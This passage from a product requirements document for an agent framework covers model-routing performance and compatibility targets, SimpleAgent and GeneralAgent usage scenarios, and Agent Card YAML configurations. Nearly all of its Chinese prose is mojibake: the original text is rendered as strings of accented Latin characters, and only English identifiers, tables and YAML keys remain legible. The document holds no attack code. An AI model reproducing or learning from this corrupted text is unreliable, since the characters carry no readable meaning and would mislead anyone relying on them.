- è‡ªåŠ¨é€‰æ‹©ç­–ç•¥å‡å°‘äººå·¥å¹²é¢„

**è¡¡é‡æ ‡å‡†**:
- 90%ä»¥ä¸Šä»»åŠ¡ä½¿ç”¨chat/baseæ¨¡å‹
- reasonæ¨¡å‹è°ƒç”¨å æ¯”<5%
- ç”¨æˆ·æ»¡æ„åº¦>85%

---

#### NFR-MODEL-2:æ€§èƒ½è¦æ±‚

**è¦æ±‚**:
- ModelRegistry.prefer()å»¶è¿Ÿ<1ms
- ModelResolverå®ä¾‹åŒ–å»¶è¿Ÿ<50ms
- æ¨¡å‹åˆ‡æ¢å¯¹ç”¨æˆ·é€æ˜(æ— æ„ŸçŸ¥)

**è¡¡é‡æ ‡å‡†**:
- è·¯ç”±å†³ç­–æ—¶é—´<1ms
- é¦–æ¬¡æ¨¡å‹è°ƒç”¨å»¶è¿Ÿ<100ms(åŒ…å«ç½‘ç»œ)
- åç»­è°ƒç”¨å¤ç”¨è¿æ¥

---

#### NFR-MODEL-3:å¯æ‰©å±•æ€§

**è¦æ±‚**:
- æ”¯æŒæ·»åŠ æ–°çš„æ¨¡å‹æ§½ä½(å¦‚embedding/tts)
- æ”¯æŒè‡ªå®šä¹‰è·¯ç”±ç­–ç•¥
- é…ç½®ä¸ä»£ç åˆ†ç¦»

**å®ç°æ–¹å¼**:
- ModelSpecå¯æ‰©å±•(æ·»åŠ æ–°å­—æ®µ)
- prefer()é€»è¾‘å¯è¦†ç›–
- .envé…ç½®é©±åŠ¨

---

#### NFR-MODEL-4:å…¼å®¹æ€§

**è¦æ±‚**:
- æ”¯æŒOpenAI-compatible API
- æ”¯æŒDeepSeek/Moonshot/GLM/Qwenç­‰å›½å†…æ¨¡å‹
- æ”¯æŒè‡ªå®šä¹‰base_url

**éªŒæ”¶æ ‡å‡†**:
- âœ… æµ‹è¯•è‡³å°‘3å®¶ä¾›åº”å•†æ¨¡å‹
- âœ… è‡ªå®šä¹‰base_urlåŠŸèƒ½æ­£å¸¸
- âœ… ç¼ºå°‘API Keyæ—¶é”™è¯¯æç¤ºæ¸…æ™°

---

### å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | æ–‡ä»¶è·¯å¾„ | è¯´æ˜ |
|---------|---------|------|
| ModelSpecå®šä¹‰ | `generalAgent/models/registry.py:11-23` | æ¨¡å‹è§„æ ¼æ•°æ®ç±» |
| ModelRegistry | `generalAgent/models/registry.py:25-71` | æ³¨å†Œè¡¨å’Œè·¯ç”±é€»è¾‘ |
| build_default_registry | `generalAgent/models/registry.py:73-135` | é»˜è®¤æ³¨å†Œè¡¨æ„å»º |
| ModelResolveråè®® | `generalAgent/agents/interfaces.py:8-12` | æ¥å£å®šä¹‰ |
| resolve_model_configs | `generalAgent/runtime/model_resolver.py:55-108` | é…ç½®è§£æ |
| build_model_resolver | `generalAgent/runtime/model_resolver.py:143-177` | Resolveræ„å»º |
| invoke_planner | `generalAgent/agents/factory.py:15-36` | ä¸»Agentè°ƒç”¨ |
| invoke_subagent | `generalAgent/agents/factory.py:39-58` | Subagentè°ƒç”¨ |
| _detect_multimodal_input | `generalAgent/graph/nodes/planner.py:41-67` | å¤šæ¨¡æ€æ£€æµ‹ |
| PlannerèŠ‚ç‚¹é›†æˆ | `generalAgent/graph/nodes/planner.py:200-220` | æ¨¡å‹é€‰æ‹©è°ƒç”¨ |
| Settingsé…ç½® | `generalAgent/config/settings.py:40-90` | ModelRoutingSettings |
| åº”ç”¨åˆå§‹åŒ– | `generalAgent/runtime/app.py:150-200` | Registryå’ŒResolverè£…é… |

---


# ä¸‰ã€Agent æ¨¡æ¿ç³»ç»Ÿ
# Agent æ¨¡æ¿ç³»ç»Ÿ

### ä¸€ã€äº§å“å®šä½

**æ ¸å¿ƒä»·å€¼ä¸»å¼ **

æä¾›å¼€ç®±å³ç”¨çš„ Agent æ¨¡æ¿ï¼Œè®©å¼€å‘è€…æ— éœ€ä»é›¶æ­å»º AI åº”ç”¨ï¼Œé€šè¿‡é…ç½®å³å¯å¿«é€Ÿåˆ›å»ºç¬¦åˆç‰¹å®šåœºæ™¯çš„ AI Agentã€‚æ¡†æ¶æä¾›ä¸¤ç§æ¨¡æ¿æ»¡è¶³ä¸åŒå¤æ‚åº¦éœ€æ±‚ï¼šè½»é‡çº§çš„ SimpleAgent å’ŒåŠŸèƒ½å®Œæ•´çš„ GeneralAgentã€‚

**ç›®æ ‡ç”¨æˆ·**
- **ä¸»è¦ç”¨æˆ·**ï¼šæ¡Œé¢åº”ç”¨å¼€å‘è€…ï¼Œéœ€è¦å¿«é€Ÿé›†æˆ AI èƒ½åŠ›åˆ°åº”ç”¨ä¸­
- **æ¬¡è¦ç”¨æˆ·**ï¼šAI ç ”ç©¶è€…ï¼Œéœ€è¦åŸºç¡€æ¡†æ¶è¿›è¡Œå®éªŒå’Œæ‰©å±•

**ä¸¤ç§æ¨¡æ¿å®šä½**

| ç»´åº¦ | SimpleAgentï¼ˆæç®€ï¼‰ | GeneralAgentï¼ˆæ ‡å‡†ï¼‰ |
|------|-------------------|---------------------|
| **å¤æ‚åº¦** | ä½ï¼ˆå•æ¬¡è°ƒç”¨ï¼‰ | é«˜ï¼ˆå¤šè½®å¯¹è¯ï¼‰ |
| **çŠ¶æ€ç®¡ç†** | æ— çŠ¶æ€ | æœ‰çŠ¶æ€ï¼ˆä¼šè¯æŒä¹…åŒ–ï¼‰ |
| **å¾ªç¯æ‰§è¡Œ** | ä¸æ”¯æŒï¼ˆå•æ¬¡æ¨ç†ï¼‰ | æ”¯æŒï¼ˆReAct Loopï¼‰ |
| **æŠ€èƒ½ç³»ç»Ÿ** | ä¸æ”¯æŒ | æ”¯æŒï¼ˆ@mentionï¼‰ |
| **HITL å®¡æ‰¹** | ä¸æ”¯æŒ | æ”¯æŒï¼ˆå·¥å…·å®¡æ‰¹ï¼‰ |
| **å·¥ä½œåŒºéš”ç¦»** | ä¸æ”¯æŒ | æ”¯æŒï¼ˆç‹¬ç«‹å·¥ä½œåŒºï¼‰ |
| **å¯åŠ¨å¼€é”€** | ä½ï¼ˆ<100msï¼‰ | ä¸­ï¼ˆ<500msï¼‰ |
| **é€‚ç”¨åœºæ™¯** | å¿«é€Ÿåˆ†æã€ä»£ç å®¡æŸ¥ã€å•è½®ä»»åŠ¡ | å¤æ‚ç ”ç©¶ã€æ–‡æ¡£å¤„ç†ã€å¤šæ­¥éª¤ä»»åŠ¡ |

---

### äºŒã€æ ¸å¿ƒåœºæ™¯ä¸ç”¨æˆ·æ•…äº‹

#### åœºæ™¯ 1ï¼šå¿«é€Ÿä»£ç å®¡æŸ¥ï¼ˆSimpleAgentï¼‰

**ç”¨æˆ·è§’è‰²**ï¼šå¼€å‘è€…å°æï¼Œæäº¤ä»£ç å‰éœ€è¦å¿«é€Ÿæ£€æŸ¥å®‰å…¨é—®é¢˜

**ç—›ç‚¹**ï¼š
- GeneralAgent å¤ªé‡ï¼ˆéœ€è¦åˆå§‹åŒ–ä¼šè¯ã€å·¥ä½œåŒºï¼‰
- åªéœ€è¦ä¸€æ¬¡æ€§åˆ†æï¼Œä¸éœ€è¦å¤šè½®å¯¹è¯
- å¸Œæœ›ç«‹å³å¾—åˆ°ç»“æœï¼ˆ<5 ç§’ï¼‰

**ä½¿ç”¨æœ¬æ¡†æ¶çš„ä½“éªŒ**ï¼š

```
æ­¥éª¤ 1ï¼šè°ƒç”¨ SimpleAgent
ç”¨æˆ·> @simple å®¡æŸ¥ uploads/api.py çš„å®‰å…¨é—®é¢˜

æ­¥éª¤ 2ï¼šç³»ç»Ÿè¯†åˆ« @simple å¹¶è°ƒç”¨ SimpleAgent
ç³»ç»Ÿ>  [åˆ›å»º SimpleAgent å®ä¾‹]
       [åŠ è½½ä»£ç å®¡æŸ¥æ¨¡æ¿]
       [ä½¿ç”¨ reasoning æ¨¡å‹è¿›è¡Œåˆ†æ]

æ­¥éª¤ 3ï¼šSimpleAgent å•æ¬¡åˆ†æ
SimpleAgent> [è¯»å–æ–‡ä»¶å†…å®¹]
            [åˆ†æä»£ç ï¼šSQL æ³¨å…¥ã€XSSã€ç¡¬ç¼–ç å¯†é’¥]

            âœ… å®‰å…¨å®¡æŸ¥å®Œæˆï¼ˆè€—æ—¶ 3 ç§’ï¼‰ï¼š

            å‘ç° 3 ä¸ªé—®é¢˜ï¼š
            1. SQL æ³¨å…¥é£é™© (line 45): æœªä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢
            2. XSS é£é™© (line 78): æœªè½¬ä¹‰ç”¨æˆ·è¾“å…¥
            3. ç¡¬ç¼–ç å¯†é’¥ (line 102): API_KEY æš´éœ²åœ¨ä»£ç ä¸­

            å»ºè®®ä¿®å¤æ–¹æ¡ˆï¼š...

æ­¥éª¤ 4ï¼šä»»åŠ¡ç»“æŸï¼ˆæ— ä¼šè¯ä¿ç•™ï¼‰
```

**ä»·å€¼ä½“ç°**ï¼š
- âœ… å“åº”é€Ÿåº¦ï¼š3 ç§’ï¼ˆvs GeneralAgent 10 ç§’+ï¼‰
- âœ… èµ„æºå ç”¨ï¼šä½ï¼ˆæ— ä¼šè¯æŒä¹…åŒ–ã€å·¥ä½œåŒºåˆ›å»ºï¼‰
- âœ… é€‚åˆé«˜é¢‘è°ƒç”¨ï¼šä»£ç å®¡æŸ¥ã€å¿«é€Ÿé—®ç­”

---

#### åœºæ™¯ 2ï¼šå¤æ‚æ–‡æ¡£åˆ†æï¼ˆGeneralAgentï¼‰

**ç”¨æˆ·è§’è‰²**ï¼šç ”ç©¶å‘˜ç‹æ˜ï¼Œéœ€è¦åˆ†æ 80 é¡µçš„ç ”ç©¶æŠ¥å‘Š PDF

**ç—›ç‚¹**ï¼š
- SimpleAgent æ— æ³•å¤„ç†å¤šæ­¥éª¤ä»»åŠ¡ï¼ˆæå–è¡¨æ ¼ã€æ€»ç»“ç« èŠ‚ã€ç”Ÿæˆæ‘˜è¦ï¼‰
- éœ€è¦ä½¿ç”¨æŠ€èƒ½åŒ…ï¼ˆ@pdfï¼‰å¤„ç† PDF
- éœ€è¦å¤šè½®å¯¹è¯ç¡®è®¤ç»†èŠ‚

**ä½¿ç”¨æœ¬æ¡†æ¶çš„ä½“éªŒ**ï¼š

```
æ­¥éª¤ 1ï¼šä¸Šä¼ æ–‡ä»¶å¹¶æå‡ºéœ€æ±‚
ç”¨æˆ·ä¸Šä¼ ï¼šresearch_report.pdf (80é¡µ)
ç³»ç»Ÿ> [è‡ªåŠ¨åŠ è½½ @pdf æŠ€èƒ½]
      [åˆ›å»ºä¼šè¯å·¥ä½œåŒº]

ç”¨æˆ·> åˆ†æè¿™ä»½ç ”ç©¶æŠ¥å‘Šï¼Œæå–æ‰€æœ‰æ•°æ®è¡¨æ ¼å¹¶ç”Ÿæˆæ‘˜è¦

æ­¥éª¤ 2ï¼šGeneralAgent å¤šæ­¥éª¤æ‰§è¡Œ
GeneralAgent> [Loop 1] é˜…è¯» PDF æŠ€èƒ½æ–‡æ¡£
             [Loop 2] æå–æ–‡æœ¬å†…å®¹ï¼ˆå‰ 10 é¡µé¢„è§ˆï¼‰
             [Loop 3] è°ƒç”¨ search_file æœç´¢ "è¡¨æ ¼"
             [Loop 4] æå– 15 ä¸ªè¡¨æ ¼æ•°æ®
             [Loop 5] ç”Ÿæˆç« èŠ‚æ‘˜è¦
             [Loop 6] æ±‡æ€»æœ€ç»ˆæŠ¥å‘Š

æ­¥éª¤ 3ï¼šç”¨æˆ·è¿½é—®ç»†èŠ‚
ç”¨æˆ·> ç¬¬ 3 ä¸ªè¡¨æ ¼çš„æ•°æ®æœ‰æ²¡æœ‰å¼‚å¸¸å€¼ï¼Ÿ

GeneralAgent> [Loop 7] è¯»å–ç¬¬ 3 ä¸ªè¡¨æ ¼æ•°æ®
             [Loop 8] ç»Ÿè®¡åˆ†æ

             å‘ç° 2 ä¸ªå¼‚å¸¸å€¼ï¼š...

æ­¥éª¤ 4ï¼šä¼šè¯ä¿å­˜
ç³»ç»Ÿ> [ä¿å­˜ä¼šè¯åˆ° data/sessions.db]
      [ä¿ç•™å·¥ä½œåŒº data/workspace/session-001/]

ç”¨æˆ·ä¸‹æ¬¡å¯ä»¥ç»§ç»­å¯¹è¯ï¼š/load session-001
```

**ä»·å€¼ä½“ç°**ï¼š
- âœ… å¤æ‚ä»»åŠ¡å¤„ç†ï¼šå¤šæ­¥éª¤è‡ªåŠ¨æ¨ç†ï¼ˆ6-8 æ¬¡å¾ªç¯ï¼‰
- âœ… æŠ€èƒ½æ”¯æŒï¼šä½¿ç”¨ @pdf æŠ€èƒ½å¤„ç†æ–‡æ¡£
- âœ… ä¼šè¯æŒä¹…åŒ–ï¼šå¯ä»¥ä¸­æ–­åç»§ç»­
- âœ… ä¸Šä¸‹æ–‡ç»´æŠ¤ï¼šè®°ä½ä¹‹å‰çš„åˆ†æç»“æœ

---

#### åœºæ™¯ 3ï¼šæ‰¹é‡è°ƒç”¨ SimpleAgentï¼ˆGeneralAgent å§”æ´¾ï¼‰

**ç”¨æˆ·è§’è‰²**ï¼šé¡¹ç›®ç»ç†å¼ åï¼Œéœ€è¦å®¡æŸ¥ 20 ä¸ªä»£ç æ–‡ä»¶

**éœ€æ±‚**ï¼šå¸Œæœ›å¹¶è¡Œå®¡æŸ¥å¤šä¸ªæ–‡ä»¶ï¼Œä½†æ¯ä¸ªæ–‡ä»¶çš„å®¡æŸ¥æ˜¯ç‹¬ç«‹çš„ï¼ˆä¸éœ€è¦ä¼šè¯çŠ¶æ€ï¼‰

**ä½¿ç”¨æœ¬æ¡†æ¶çš„ä½“éªŒ**ï¼š

```
ç”¨æˆ·> å®¡æŸ¥ src/ ç›®å½•ä¸‹æ‰€æœ‰ Python æ–‡ä»¶çš„ä»£ç è´¨é‡

GeneralAgent> [Loop 1] ä½¿ç”¨ find_files æŸ¥æ‰¾æ‰€æœ‰ .py æ–‡ä»¶
             [å‘ç° 20 ä¸ªæ–‡ä»¶]

             [Loop 2] å†³å®šä½¿ç”¨ delegate_task å¹¶è¡Œå¤„ç†

             [è°ƒç”¨ delegate_task å·¥å…· 20 æ¬¡ï¼ˆå¹¶è¡Œï¼‰]
             æ¯æ¬¡è°ƒç”¨åˆ›å»ºä¸€ä¸ª SimpleAgent å®ä¾‹ï¼š
             - delegate_task("å®¡æŸ¥ src/file1.py çš„ä»£ç è´¨é‡")
             - delegate_task("å®¡æŸ¥ src/file2.py çš„ä»£ç è´¨é‡")
             - ...

             [Loop 3] æ±‡æ€» 20 ä¸ªå®¡æŸ¥ç»“æœ

             âœ… ä»£ç è´¨é‡å®¡æŸ¥å®Œæˆï¼ˆ20 ä¸ªæ–‡ä»¶ï¼Œè€—æ—¶ 15 ç§’ï¼‰

             æ€»ç»“ï¼š
             - 5 ä¸ªæ–‡ä»¶æœ‰å®‰å…¨é—®é¢˜
             - 8 ä¸ªæ–‡ä»¶éœ€è¦ä¼˜åŒ–æ€§èƒ½
             - 7 ä¸ªæ–‡ä»¶ç¬¦åˆè§„èŒƒ
```

**ä»·å€¼ä½“ç°**ï¼š
- âœ… å¹¶è¡Œå¤„ç†ï¼š20 ä¸ªæ–‡ä»¶åŒæ—¶å®¡æŸ¥
- âœ… è½»é‡å§”æ´¾ï¼šæ¯ä¸ªå­ä»»åŠ¡ç”¨ SimpleAgentï¼ˆå¿«é€Ÿï¼‰
- âœ… ç»“æœæ±‡æ€»ï¼šGeneralAgent è´Ÿè´£æ•´ä½“åè°ƒ

---

### ä¸‰ã€åŠŸèƒ½éœ€æ±‚æ¸…å•

#### 3.1 Agent Card æ ‡å‡†

**éœ€æ±‚ 1ï¼šAgent Card å…ƒæ•°æ®è§„èŒƒ**

**éœ€æ±‚æè¿°**ï¼š
å®šä¹‰åŸºäº A2A Protocol çš„ Agent Card æ ‡å‡†ï¼Œç”¨äºæè¿° Agent çš„èº«ä»½ã€èƒ½åŠ›ã€æŠ€èƒ½ç­‰å…ƒæ•°æ®ã€‚

**Agent Card ç»“æ„**ï¼š

```yaml
<agent_id>:
  # ========== Identity (èº«ä»½ä¿¡æ¯) ==========
  name: <Agent æ˜¾ç¤ºåç§°>
  description: <ä¸€å¥è¯åŠŸèƒ½æè¿°>
  provider: <local/remote>  # æœ¬åœ° or è¿œç¨‹
  version: <ç‰ˆæœ¬å·>

  # ========== Service Endpoint (æœåŠ¡ç«¯ç‚¹) ==========
  factory_path: <å·¥å‚å‡½æ•°è·¯å¾„>  # provider=local æ—¶ä½¿ç”¨
  # ä¾‹å¦‚: "simpleAgent.simple_agent:SimpleAgent"

  # ========== Capabilities (èƒ½åŠ›ç‰¹æ€§) ==========
  capabilities:
    - name: <èƒ½åŠ›åç§°>
      description: <èƒ½åŠ›æè¿°>
    # ç¤ºä¾‹ï¼šstatelessã€fastã€single_turnã€template_support

  # ========== Skills (æŠ€èƒ½æ¸…å•) â­ æ ¸å¿ƒ ==========
  skills:
    - name: <æŠ€èƒ½åç§°>
      description: <æŠ€èƒ½æè¿°>
      input_mode: <text/json/structured/multimodal>
      output_mode: <text/json/markdown/stream>
      examples:
        - <ä½¿ç”¨ç¤ºä¾‹ 1>
        - <ä½¿ç”¨ç¤ºä¾‹ 2>
      parameters:
        <å‚æ•°å>: <å‚æ•°æè¿°>

  # ========== Metadata (å…ƒæ•°æ®) ==========
  tags: [<æ ‡ç­¾åˆ—è¡¨>]
  enabled: <true/false>
  always_available: <true/false>
  available_to_subagent: <true/false>
```

**å­—æ®µè¯´æ˜**ï¼š

| å­—æ®µ | å¿…éœ€ | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|------|------|
| **Identity** | | | |
| name | æ˜¯ | Agent æ˜¾ç¤ºåç§° | "SimpleAgent" |
| description | æ˜¯ | åŠŸèƒ½ç®€è¿°ï¼ˆä¸€å¥è¯ï¼‰ | "è½»é‡çº§ Agentï¼Œå¿«é€Ÿæ‰§è¡Œç®€å•ä»»åŠ¡" |
| provider | æ˜¯ | æä¾›è€…ç±»å‹ | "local" / "remote" |
| version | æ˜¯ | ç‰ˆæœ¬å· | "1.0.0" |
| **Service Endpoint** | | | |
| factory_path | æ˜¯* | å·¥å‚å‡½æ•°è·¯å¾„ï¼ˆlocal agentï¼‰ | "simpleAgent.simple_agent:SimpleAgent" |
| endpoint | æ˜¯* | HTTP endpointï¼ˆremote agentï¼‰ | "http://api.example.com/agent" |
| **Capabilities** | | | |
| capabilities | å¦ | èƒ½åŠ›ç‰¹æ€§åˆ—è¡¨ | statelessã€fastã€multi_turn |
| **Skills** | | | |
| skills | æ˜¯ | æŠ€èƒ½æ¸…å•ï¼ˆæ ¸å¿ƒï¼‰ | è§ä¸‹æ–¹ |
| **Metadata** | | | |
| tags | å¦ | æ ‡ç­¾åˆ—è¡¨ | ["lightweight", "stateless"] |
| enabled | å¦ | æ˜¯å¦å¯ç”¨ | true |
| available_to_subagent | å¦ | å­ Agent æ˜¯å¦å¯è°ƒç”¨ | true |

**Skills å­—æ®µè¯¦è§£**ï¼š

| å­—æ®µ | å¿…éœ€ | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|------|------|
| name | æ˜¯ | æŠ€èƒ½å”¯ä¸€æ ‡è¯† | "quick_analysis" |
| description | æ˜¯ | æŠ€èƒ½åŠŸèƒ½æè¿° | "å¿«é€Ÿåˆ†æå•ä¸ªæ–‡ä»¶ï¼ˆ<100 è¡Œä»£ç ï¼‰" |
| input_mode | æ˜¯ | è¾“å…¥æ¨¡å¼ | text / json / multimodal |
| output_mode | æ˜¯ | è¾“å‡ºæ¨¡å¼ | text / json / markdown / stream |
| examples | æ˜¯ | ä½¿ç”¨ç¤ºä¾‹ï¼ˆ3-5 ä¸ªï¼‰ | "åˆ†æ uploads/script.py çš„å¤æ‚åº¦" |
| parameters | å¦ | å‚æ•°è¯´æ˜ | `file_path`: "è¦åˆ†æçš„æ–‡ä»¶è·¯å¾„" |

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… Agent Card ç¬¦åˆ A2A Protocol æ ‡å‡†
- âœ… Skills æ¸…å•å®Œæ•´ï¼ŒåŒ…å« 3-5 ä¸ªç¤ºä¾‹
- âœ… Capabilities å‡†ç¡®æè¿° Agent ç‰¹æ€§
- âœ… factory_path æˆ– endpoint å¿…é¡»æä¾›ä¸€ä¸ª

**å®ç°å‚è€ƒ**ï¼š`generalAgent/agents/schema.py`ã€`generalAgent/config/agents.yaml`

---

**éœ€æ±‚ 2ï¼šSimpleAgent é…ç½®**

**éœ€æ±‚æè¿°**ï¼š
SimpleAgent çš„ Agent Card é…ç½®ï¼Œå®šä¹‰å…¶èº«ä»½ã€èƒ½åŠ›å’ŒæŠ€èƒ½ã€‚

**é…ç½®ç¤ºä¾‹**ï¼š

```yaml
simple:
  # Identity
  name: "SimpleAgent"
  description: "è½»é‡çº§ Agentï¼Œé€‚åˆå¿«é€Ÿæ‰§è¡Œç®€å•ä»»åŠ¡ï¼ˆæ— çŠ¶æ€ï¼Œå•æ¬¡è°ƒç”¨ï¼‰"
  provider: "local"
  version: "1.0.0"

  # Service Endpoint
  factory_path: "simpleAgent.simple_agent:SimpleAgent"

  # Capabilities
  capabilities:
    - name: "stateless"
      description: "æ— çŠ¶æ€ï¼Œä¸ä¿ç•™ä¼šè¯å†å²"
    - name: "fast"
      description: "å¿«é€Ÿå“åº”ï¼Œæ— éœ€åˆå§‹åŒ–å¼€é”€"
    - name: "single_turn"
      description: "å•è½®å¯¹è¯ï¼Œä¸€æ¬¡æ€§å®Œæˆä»»åŠ¡"
    - name: "template_support"
      description: "æ”¯æŒè‡ªå®šä¹‰ Prompt æ¨¡æ¿"

  # Skills
  skills:
    - name: "quick_analysis"
      description: "å¿«é€Ÿåˆ†æå•ä¸ªæ–‡ä»¶ï¼ˆ<100 è¡Œä»£ç ï¼‰æˆ–å°å‹æ–‡æ¡£"
      input_mode: "text"
      output_mode: "markdown"
      examples:
        - "åˆ†æ uploads/script.py çš„å¤æ‚åº¦"
        - "å®¡æŸ¥ uploads/config.json çš„è¯­æ³•é”™è¯¯"
        - "æ£€æŸ¥ uploads/data.csv çš„æ•°æ®è´¨é‡"
      parameters:
        file_path: "è¦åˆ†æçš„æ–‡ä»¶è·¯å¾„"
        template: "ï¼ˆå¯é€‰ï¼‰è‡ªå®šä¹‰åˆ†ææ¨¡æ¿"

    - name: "reasoning_task"
      description: "ä½¿ç”¨æ¨ç†æ¨¡å‹è§£å†³æ•°å­¦/é€»è¾‘é—®é¢˜"
      input_mode: "text"
      output_mode: "text"
      examples:
        - "è®¡ç®— fibonacci(100)"
        - "è§£å†³8çš‡åé—®é¢˜"
      parameters:
        task: "æ•°å­¦æˆ–é€»è¾‘é—®é¢˜æè¿°"
        model_type: "ï¼ˆå¯é€‰ï¼‰æŒ‡å®šæ¨¡å‹ç±»å‹ï¼Œé»˜è®¤ reasoning"

    - name: "code_review"
      description: "å¿«é€Ÿä»£ç å®¡æŸ¥ï¼ˆè¯­æ³•ã€é£æ ¼ã€å®‰å…¨é—®é¢˜ï¼‰"
      input_mode: "text"
      output_mode: "markdown"
      examples:
        - "å®¡æŸ¥ uploads/api.py çš„å®‰å…¨é—®é¢˜"
        - "æ£€æŸ¥ uploads/component.tsx çš„ React æœ€ä½³å®è·µ"
      parameters:
        file_path: "ä»£ç æ–‡ä»¶è·¯å¾„"
        focus: "ï¼ˆå¯é€‰ï¼‰å®¡æŸ¥é‡ç‚¹ï¼Œå¦‚ security, style, performance"

  # Metadata
  tags: ["lightweight", "stateless", "single-turn", "fast"]
  enabled: true
  always_available: false
  available_to_subagent: true
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… åŒ…å« 3-5 ä¸ªæ ¸å¿ƒæŠ€èƒ½
- âœ… æ¯ä¸ªæŠ€èƒ½æœ‰ 2-3 ä¸ªç¤ºä¾‹
- âœ… Capabilities å‡†ç¡®åæ˜  SimpleAgent ç‰¹æ€§ï¼ˆstatelessã€fastï¼‰
- âœ… available_to_subagent: trueï¼ˆGeneralAgent å¯è°ƒç”¨ï¼‰

**å®ç°å‚è€ƒ**ï¼š`generalAgent/config/agents.yaml`ã€`simpleAgent/simple_agent.py`

---

**éœ€æ±‚ 3ï¼šGeneralAgent é…ç½®**

**éœ€æ±‚æè¿°**ï¼š
GeneralAgent çš„ Agent Card é…ç½®ï¼Œå®šä¹‰å…¶èº«ä»½ã€èƒ½åŠ›å’ŒæŠ€èƒ½ã€‚

**é…ç½®ç¤ºä¾‹**ï¼š

```yaml
general:
  # Identity
  name: "GeneralAgent"
  description: "å®Œæ•´åŠŸèƒ½çš„ Agentï¼Œæ”¯æŒæŠ€èƒ½ã€å¤šè½®å¯¹è¯ã€ä¼šè¯æŒä¹…åŒ–ï¼ˆæœ‰çŠ¶æ€ï¼‰"
  provider: "local"
  version: "1.0.0"

  # Service Endpoint
  factory_path: "generalAgent.runtime.app:build_application"

  # Capabilities
  capabilities:
    - name: "stateful"
      description: "æœ‰çŠ¶æ€ï¼Œä¿ç•™å®Œæ•´ä¼šè¯å†å²"
    - name: "multi_turn"
      description: "æ”¯æŒå¤šè½®å¯¹è¯å’Œå¤æ‚æ¨ç†"
    - name: "skill_system"
      description: "æ”¯æŒåŠ è½½å’Œä½¿ç”¨æŠ€èƒ½åŒ…ï¼ˆ@mention skillsï¼‰"
    - name: "hitl"
      description: "æ”¯æŒäººæœºäº¤äº’å®¡æ‰¹ï¼ˆHuman-in-the-Loopï¼‰"
    - name: "persistence"
      description: "æ”¯æŒä¼šè¯æŒä¹…åŒ–ï¼ˆSQLiteï¼‰"
    - name: "workspace"
      description: "ç‹¬ç«‹çš„å·¥ä½œç©ºé—´éš”ç¦»"

  # Skills
  skills:
    - name: "complex_document_analysis"
      description: "åˆ†æå¤§å‹æ–‡æ¡£ï¼ˆ>10 é¡µ PDF/DOCX/XLSX/PPTXï¼‰"
      input_mode: "text"
      output_mode: "markdown"
      examples:
        - "åˆ†æ uploads/report.pdfï¼ˆ80é¡µï¼‰ï¼Œæå–æ‰€æœ‰è¡¨æ ¼æ•°æ®"
        - "æ€»ç»“ uploads/research.docxï¼ˆ50é¡µï¼‰çš„ç ”ç©¶ç»“è®º"
        - "åˆ†æ uploads/data.xlsxï¼ˆ20ä¸ªå·¥ä½œè¡¨ï¼‰çš„è´¢åŠ¡æŒ‡æ ‡"
      parameters:
        file_path: "æ–‡æ¡£è·¯å¾„"
        task: "åˆ†æä»»åŠ¡æè¿°"

    - name: "skill_based_task"
      description: "éœ€è¦ä½¿ç”¨æŠ€èƒ½åŒ…çš„ä»»åŠ¡ï¼ˆå¦‚ @pdf, @docx æŠ€èƒ½ï¼‰"
      input_mode: "text"
      output_mode: "text"
      examples:
        - "ä½¿ç”¨ @pdf æŠ€èƒ½å¡«å†™ uploads/form.pdf è¡¨å•"
        - "ä½¿ç”¨ @docx æŠ€èƒ½ä¿®æ”¹ uploads/contract.docx ä¸­çš„åˆåŒæ¡æ¬¾"
      parameters:
        skill: "æŠ€èƒ½åŒ…åç§°ï¼ˆå¦‚ pdf, docxï¼‰"
        task: "ä»»åŠ¡æè¿°"

    - name: "multi_step_research"
      description: "å¤šæ­¥éª¤ç ”ç©¶ä»»åŠ¡ï¼ˆéœ€è¦å¤šè½®å·¥å…·è°ƒç”¨ï¼‰"
      input_mode: "text"
      output_mode: "markdown"
      examples:
        - "ç ”ç©¶ Python 3.13 çš„æ–°ç‰¹æ€§ï¼Œå¹¶ç”Ÿæˆå¯¹æ¯”æŠ¥å‘Š"
        - "åˆ†æç«å“çš„å®šä»·ç­–ç•¥ï¼Œç”Ÿæˆå¸‚åœºåˆ†ææŠ¥å‘Š"
      parameters:
        topic: "ç ”ç©¶ä¸»é¢˜"
        output_format: "è¾“å‡ºæ ¼å¼ï¼ˆå¦‚ markdown è¡¨æ ¼ã€JSONï¼‰"

  # Metadata
  tags: ["full-featured", "stateful", "multi-turn", "complex"]
  enabled: false  # é»˜è®¤ä¸å¯ç”¨ï¼ˆGeneralAgent æ˜¯ä¸» Agentï¼‰
  always_available: false
  available_to_subagent: false  # é˜²æ­¢æ— é™é€’å½’
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… åŒ…å« 3-5 ä¸ªæ ¸å¿ƒæŠ€èƒ½
- âœ… Skills è¦†ç›–å¤æ‚ä»»åŠ¡åœºæ™¯ï¼ˆå¤šæ­¥éª¤ã€æŠ€èƒ½ä½¿ç”¨ã€æ–‡æ¡£å¤„ç†ï¼‰
- âœ… Capabilities åŒ…å« statefulã€multi_turnã€skill_system
- âœ… available_to_subagent: falseï¼ˆé˜²æ­¢è‡ªæˆ‘è°ƒç”¨ï¼‰

**å®ç°å‚è€ƒ**ï¼š`generalAgent/config/agents.yaml`ã€`generalAgent/runtime/app.py`

---

#### 3.2 SimpleAgent æ¨¡æ¿

**éœ€æ±‚ 4ï¼šSimpleAgent æ ¸å¿ƒåŠŸèƒ½**

**éœ€æ±‚æè¿°**ï¼š
æä¾›è½»é‡çº§ã€æ— çŠ¶æ€çš„ Agent æ¨¡æ¿ï¼Œæ”¯æŒå•æ¬¡æ¨ç†ã€è‡ªå®šä¹‰æ¨¡æ¿ã€å·¥å…·å®šåˆ¶ã€‚

**æ ¸å¿ƒç‰¹æ€§**ï¼š

| ç‰¹æ€§ | è¯´æ˜ | å®ç°æ–¹å¼ |
|------|------|----------|
| æ— çŠ¶æ€ | ä¸ä¿å­˜ä¼šè¯å†å² | æ—  Session Store |
| å•æ¬¡æ¨ç† | ä¸€æ¬¡ LLM è°ƒç”¨å®Œæˆ | æ—  ReAct Loop |
| è‡ªå®šä¹‰æ¨¡æ¿ | æ”¯æŒ Jinja2 æ¨¡æ¿ | PromptBuilder |
